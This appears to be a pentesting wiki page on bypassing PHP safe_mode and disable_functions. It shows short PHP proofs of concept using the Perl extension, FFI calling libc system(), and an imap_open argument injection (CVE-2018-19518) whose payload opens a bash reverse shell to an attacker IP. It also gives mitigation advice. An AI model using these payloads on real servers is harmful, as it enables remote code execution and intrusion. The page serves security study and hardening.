# PHP Perl Extension Safe_mode Bypass Exploit

{{#include ../../../../banners/hacktricks-training.md}}

This historical proof-of-concept shows how the third-party **Perl** PHP extension can be abused to recover command execution even when **safe_mode** (deprecated since PHP 5.3 and completely removed in PHP 5.4) or the related **disable_functions** directive tries to forbid the classic `system()/exec()` gadget family.

Although modern deployments seldom ship the `perl` extension, understanding the primitive is still useful because **any loaded extension that exposes a wrapper around `system(3)` (or another process-creation API) will bypass `disable_functions` transparently**: the Zend engine only patches the internal handlers registered in the *function_table*, therefore *new* symbols provided by extensions are out of scope.

## Legacy PoC

From the original article – [Safebuff « Disable-functions bypass » (May 2016)](http://blog.safebuff.com/2016/05/06/disable-functions-bypass/) – stripped to the minimum:

```php
<?php
if (!extension_loaded('perl')) die('perl extension is not loaded');
$perl = new perl();
$perl->eval("system('id');");
?>
```

---

## Context & Limitations (2025)

* **safe_mode is long gone**: it was deprecated in PHP 5.3 (2009) and removed in PHP 5.4 (2012). If you face `safe_mode` today you are dealing with an *extremely* old code base.
* **disable_functions / disable_classes** are still common hardening knobs**, especially in shared-hosting environments. The directive just replaces the handler pointer **inside the function_table**; anything that:
  1. Calls `execve(2)` *indirectly* (e.g. IMAP, FFI, ImageMagick, GD, etc.) or
  2. Restores/overrides the original handler pointers
  will happily bypass the restriction.

The following two modern techniques (actively seen in Red-Team engagements up to mid-2025) complement the historical Perl extension trick.

### 1. Bypass with the **FFI** extension (PHP ≥ 7.4)

`FFI` (Foreign Function Interface) allows userland scripts to call arbitrary symbols from shared libraries. It lives **outside** the disabled-function mechanism so we can directly dispatch `system(3)` from *libc*:

```php
<?php
ini_set('display_errors', 1);
if (!extension_loaded('ffi')) die('FFI disabled');

$ffi = FFI::cdef("int system(const char *command);", "libc.so.6");
$ffi->system("/usr/bin/id");
?>
```

Notes:
* Works on Linux; replace `libc.so.6` by `msvcrt.dll` on Windows (`_popen` gives bidirectional I/O).
* `ffi.enable = preload` **still allows exploitation through preloaded scripts** (common on frameworks that ship an opcache preload file).
* Harden by compiling PHP **`--without-ffi`** or setting both `ffi.enable = 0` and `ffi.enable_cli = 0`.



### 2. Command-injection inside enabled functions – `imap_open()` vector

Several internal functions spawn helper binaries with user-controlled parameters. A well-known case is `imap_open()` which, when provided with a *rsh* style remote hostname, ends up executing an external `rsh/ssh` command. Argument-injection through the `-oProxyCommand=` switch (CVE-2018-19518) leads to code execution even if `exec()` et al. are disabled:

```php
<?php
$payload = '{malicious.example.com/imap/ssl/novalidate-cert/imap123 -oProxyCommand="bash -c \"bash -i >& /dev/tcp/10.10.14.6/4444 0>&1\""}user@example.com';
imap_open($payload, 'user', 'pass');
?>
```

Any directive that blocks outbound network access but still allows `imap_open()` will be circumvented.

Mitigation: make sure the **IMAP extension is not loaded** when not required, or patch to a fixed version (the upstream fix escapes dangerous characters). 

---

## Defensive checklist (2025)

1. Prefer **container / process isolation** (php-fpm per vhost) over `disable_functions`.
2. Compile PHP **without risky extensions** (`--disable-imap --without-ffi --without-readline …`).
3. Maintain an *allow-list* of required internal functions instead of the traditional block-list.
4. Use **open_basedir** only as a second line of defence; it offers no protection against in-memory bypasses (FFI, `proc_open()` UAF, etc.).
5. Monitor for suspicious `putenv()+mail()` chains (see [Chankro](https://github.com/TarlogicSecurity/chankro)) which combine `LD_PRELOAD` injection and external sender binaries. 

---



## References

* Tarlogic – “A deep dive into disable_functions bypass and PHP exploitation” (2023)  
* PHP manual – FFI::cdef documentation  
* NVD – CVE-2018-19518 (imap_open argument-injection)
{{#include ../../../../banners/hacktricks-training.md}}
